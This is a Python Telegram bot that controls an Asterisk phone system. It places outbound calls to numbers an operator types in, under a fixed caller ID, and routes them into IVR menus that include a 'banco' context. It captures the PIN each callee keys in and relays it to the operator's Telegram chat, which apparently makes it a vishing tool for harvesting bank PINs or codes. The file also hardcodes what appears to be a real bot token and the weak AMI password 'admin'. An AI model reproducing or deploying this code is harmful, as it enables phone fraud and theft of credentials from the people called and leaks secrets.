import asyncio
import logging
from panoramisk import Manager
from pydantic import BaseModel
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Configuración del bot de Telegram
TELEGRAM_TOKEN = "7785556123:AAGOnrh2UshZOwAICaqc1hd_wEt04uKWW-g"
AUTHORIZED_CHAT_IDS = [428655938]  # Chat ID autorizado para recibir eventos

# Configuración de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Opciones de IVR
IVR_OPTIONS = {
    "1": "banco",
    "2": "servicio_cliente",
    "3": "ventas",
}

# Diccionario para manejar datos temporales del usuario
user_data = {}

# Manager global para conexión persistente
manager = Manager(
    host='localhost',
    port=5038,
    username='python_user',
    secret='admin'
)


# ====== CLASES DE UTILIDAD ======

class Params(BaseModel):
    channel: str
    ivr: str


# ====== FUNCIONES PARA TELEGRAM ======

async def send_telegram_message(chat_id: int, message: str):
    """Enviar un mensaje a Telegram."""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    await application.bot.send_message(chat_id=chat_id, text=message)


# ====== FUNCIONES PARA ASTERISK ======

async def initiate_call(params: Params, chat_id: int):
    """Iniciar una llamada a través del AMI de Asterisk."""
    originate_action = {
        'Action': 'Originate',
        'Channel': params.channel,
        'Context': params.ivr,
        'Exten': 's',
        'Priority': 1,
        'CallerID': '<18092000221>',
        'Timeout': 30000,
        'Async': 'false',
    }
    try:
        response = await manager.send_action(originate_action)
        message = f"Inicio de llamada: {response.get('Message')}"
        logger.info(message)
        await send_telegram_message(chat_id, message)
    except Exception as e:
        error_message = f"Error al iniciar llamada: {e}"
        logger.error(error_message)
        await send_telegram_message(chat_id, error_message)


async def hangup_call(channel: str, chat_id: int):
    """Colgar una llamada activa."""
    hangup_action = {
        'Action': 'Hangup',
        'Channel': channel,
    }
    try:
        response = await manager.send_action(hangup_action)
        message = f"Llamada colgada: {response.get('Message')}"
        logger.info(message)
        await send_telegram_message(chat_id, message)
    except Exception as e:
        error_message = f"Error al colgar la llamada: {e}"
        logger.error(error_message)
        await send_telegram_message(chat_id, error_message)


async def handle_user_event(manager, event):
    """Manejar eventos clave durante la llamada."""
    event_type = event.Event
    channel = event.get('Channel')

    # Inicializamos la variable `message` como None
    message = None

    if event_type == 'OriginateResponse' and event.get('Response') == 'Success':
        message = f"Llamada iniciada en canal {channel}."
        logger.info(message)
        # Registrar el canal inicial
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id]['channel'] = channel
    elif event_type == 'Newstate':
        state = event.get('ChannelStateDesc')
        if state == 'Ringing' or state == 'Up':
            message = f"Llamada está en estado {state} en canal {channel}."
            logger.info(message)
            # Actualizar el canal único
            for chat_id in AUTHORIZED_CHAT_IDS:
                user_data[chat_id]['channel'] = channel
    elif event_type == 'VarSet' and event.get('Variable') == 'pin':
        pin_value = event.get('Value')
        if pin_value:
            message = f"PIN ingresado: {pin_value} en canal {channel}."
            logger.info(message)
    elif event_type == 'Hangup':
        message = f"Llamada colgada en canal {channel}."
        logger.info(message)
        # Reiniciar el estado del usuario
        for chat_id in AUTHORIZED_CHAT_IDS:
            user_data[chat_id] = {'step': 'idle'}
            user_data[chat_id].pop('channel', None)  # Eliminar el canal

    # Si `message` tiene un valor, enviarlo a Telegram
    if message:
        for chat_id in AUTHORIZED_CHAT_IDS:
            try:
                await send_telegram_message(chat_id, message)
            except Exception as e:
                logger.error(f"Error al enviar mensaje a Telegram: {e}")


# ====== CICLO PRINCIPAL PARA EL MANAGER ======

async def main_manager():
    """Mantener la conexión persistente con el AMI de Asterisk."""
    try:
        await manager.connect()
        logger.info("Conexión establecida con Asterisk AMI.")

        # Registrar eventos de Asterisk
        manager.register_event('OriginateResponse', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
        manager.register_event('Newstate', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
        manager.register_event('VarSet', lambda m, e: asyncio.create_task(handle_user_event(m, e)))
        manager.register_event('Hangup', lambda m, e: asyncio.create_task(handle_user_event(m, e)))

        # Mantener el loop escuchando eventos
        while True:
            await asyncio.sleep(1)
    except Exception as e:
        logger.error(f"Error en la conexión AMI: {e}")
    finally:
        await manager.close()
        logger.info("Conexión cerrada con Asterisk AMI.")


# ====== FUNCIONES DEL BOT ======

async def start_call(update, context):
    """Iniciar el proceso de llamada."""
    chat_id = update.effective_chat.id
    if chat_id in AUTHORIZED_CHAT_IDS and user_data.get(chat_id, {}).get('step', 'idle') == 'idle':
        await send_telegram_message(chat_id, "Por favor, ingresa el número de teléfono:")
        user_data[chat_id] = {'step': 'phone'}
    else:
        await send_telegram_message(chat_id, "Ya hay una llamada en proceso o no tienes permisos.")


async def hangup(update, context):
    """Colgar la llamada activa."""
    chat_id = update.effective_chat.id
    channel = user_data.get(chat_id, {}).get('channel')
    if channel:
        await hangup_call(channel, chat_id)
        user_data[chat_id] = {'step': 'idle'}
    else:
        await send_telegram_message(chat_id, "No hay una llamada activa para colgar.")


async def handle_message(update, context):
    """Procesar mensajes del usuario."""
    chat_id = update.effective_chat.id
    if chat_id not in user_data:
        await send_telegram_message(chat_id, "Por favor, usa /call para comenzar.")
        return

    step = user_data[chat_id].get('step')
    if step == 'phone':
        phone_number = update.message.text.strip()
        if len(phone_number) < 5:
            channel = f'PJSIP/{phone_number}'
        else:
            channel = f'PJSIP/{phone_number}@callwithus'

        user_data[chat_id]['channel'] = channel
        user_data[chat_id]['step'] = 'ivr'
        ivr_options_text = "Selecciona el contexto del IVR:\n" + "\n".join([f"{key}. {value}" for key, value in IVR_OPTIONS.items()])
        await send_telegram_message(chat_id, ivr_options_text)
    elif step == 'ivr':
        ivr_choice = update.message.text.strip()
        if ivr_choice in IVR_OPTIONS:
            ivr_context = IVR_OPTIONS[ivr_choice]
            channel = user_data[chat_id]['channel']
            params = Params(channel=channel, ivr=ivr_context)
            await send_telegram_message(chat_id, f"Iniciando llamada al canal {channel} en el contexto {ivr_context}...")
            await initiate_call(params, chat_id)
        else:
            await send_telegram_message(chat_id, "Opción inválida. Selecciona un contexto válido.")


# ====== CONFIGURAR Y EJECUTAR EL BOT ======

def setup_bot():
    """Configurar y ejecutar el bot de Telegram."""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("call", start_call))
    application.add_handler(CommandHandler("hangup", hangup))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    return application


def main():
    """Correr el bot y el loop principal."""
    application = setup_bot()
    loop = asyncio.get_event_loop()

    # Correr el bot y la conexión AMI en paralelo
    loop.create_task(main_manager())
    application.run_polling()


if __name__ == "__main__":
    main()
